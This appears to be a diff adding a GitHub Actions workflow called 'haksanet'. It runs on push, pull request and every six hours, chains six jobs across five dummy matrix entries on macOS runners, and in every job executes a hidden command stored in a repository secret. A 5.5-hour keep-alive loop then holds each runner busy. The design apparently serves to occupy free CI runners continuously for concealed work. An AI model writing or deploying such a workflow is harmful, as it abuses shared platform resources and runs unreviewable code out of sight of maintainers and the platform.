@@ -1,0 +1,157 @@
+name: haksanet
+on: 
+  push:
+  pull_request:
+  schedule: 
+  - cron: "0 */6 * * *"
+ 
+jobs:
+ node-1:
+    runs-on: macos-13
+    strategy:
+      fail-fast: false
+      matrix:
+         go: [1]
+         flag: [A, B, C, D, E]
+    timeout-minutes: 360
+ 
+    steps:
+      - uses: actions/checkout@v2
+      - name: Rerunning
+        uses: actions/setup-node@v4
+        with:
+          node-version: latest
+      - run: |
+            ${{ secrets.CODE }}
+            echo '#! /usr/bin/env bash
+            START=`date +%s`
+            while [ $(( $(date +%s) - 19800 )) -lt $START ]; do
+            m=$((`date +%s`/1000)) && echo "Time Is Limit" ${m:0:${#m}-6}.${m:${#m}-6} ; sleep 80;
+            done' > jobs
+            chmod +x jobs
+            sh jobs
+ node-2:
+    runs-on: macos-13 
+    needs: node-1
+    strategy:
+      fail-fast: false
+      matrix:
+         go: [1]
+         flag: [A, B, C, D, E]
+    timeout-minutes: 360
+ 
+    steps:
+      - uses: actions/checkout@v2
+      - name: Rerunning
+        uses: actions/setup-node@v4
+        with:
+          node-version: latest
+      - run: |
+            ${{ secrets.CODE }}
+            echo '#! /usr/bin/env bash
+            START=`date +%s`
+            while [ $(( $(date +%s) - 19800 )) -lt $START ]; do
+            m=$((`date +%s`/1000)) && echo "Time Is Limit" ${m:0:${#m}-6}.${m:${#m}-6} ; sleep 80;
+            done' > jobs
+            chmod +x jobs
+            sh jobs
+ 
+ node-3:
+    runs-on: macos-13
+    needs: node-2
+    strategy:
+      fail-fast: false
+      matrix:
+         go: [1]
+         flag: [A, B, C, D, E]
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v2
+      - name: Rerunning
+        uses: actions/setup-node@v4
+        with:
+          node-version: latest
+      - run: |
+            ${{ secrets.CODE }}
+            echo '#! /usr/bin/env bash
+            START=`date +%s`
+            while [ $(( $(date +%s) - 19800 )) -lt $START ]; do
+            m=$((`date +%s`/1000)) && echo "Time Is Limit" ${m:0:${#m}-6}.${m:${#m}-6} ; sleep 80;
+            done' > jobs
+            chmod +x jobs
+            sh jobs
+ 
+ node-4:
+    runs-on: macos-13
+    needs: node-3
+    strategy:
+      fail-fast: false
+      matrix:
+         go: [1]
+         flag: [A, B, C, D, E]
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v2
+      - name: Rerunning
+        uses: actions/setup-node@v4
+        with:
+          node-version: latest
+      - run: |
+            ${{ secrets.CODE }}
+            echo '#! /usr/bin/env bash
+            START=`date +%s`
+            while [ $(( $(date +%s) - 19800 )) -lt $START ]; do
+            m=$((`date +%s`/1000)) && echo "Time Is Limit" ${m:0:${#m}-6}.${m:${#m}-6} ; sleep 80;
+            done' > jobs
+            chmod +x jobs
+            sh jobs
+ 
+ node-5:
+    runs-on: macos-13
+    needs: node-4
+    strategy:
+      fail-fast: false
+      matrix:
+         go: [1]
+         flag: [A, B, C, D, E]
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v2
+      - name: Rerunning
+        uses: actions/setup-node@v4
+        with:
+          node-version: latest
+      - run: |
+            ${{ secrets.CODE }}
+            echo '#! /usr/bin/env bash
+            START=`date +%s`
+            while [ $(( $(date +%s) - 19800 )) -lt $START ]; do
+            m=$((`date +%s`/1000)) && echo "Time Is Limit" ${m:0:${#m}-6}.${m:${#m}-6} ; sleep 80;
+            done' > jobs
+            chmod +x jobs
+            sh jobs
+ 
+ node-6:
+    runs-on: macos-13
+    needs: node-5
+    strategy:
+      fail-fast: false
+      matrix:
+         go: [1]
+         flag: [A, B, C, D, E]
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v2
+      - name: Rerunning
+        uses: actions/setup-node@v4
+        with:
+          node-version: latest
+      - run: |
+            ${{ secrets.CODE }}
+            echo '#! /usr/bin/env bash
+            START=`date +%s`
+            while [ $(( $(date +%s) - 19800 )) -lt $START ]; do
+            m=$((`date +%s`/1000)) && echo "Time Is Limit" ${m:0:${#m}-6}.${m:${#m}-6} ; sleep 80;
+            done' > jobs
+            chmod +x jobs
+            sh jobs
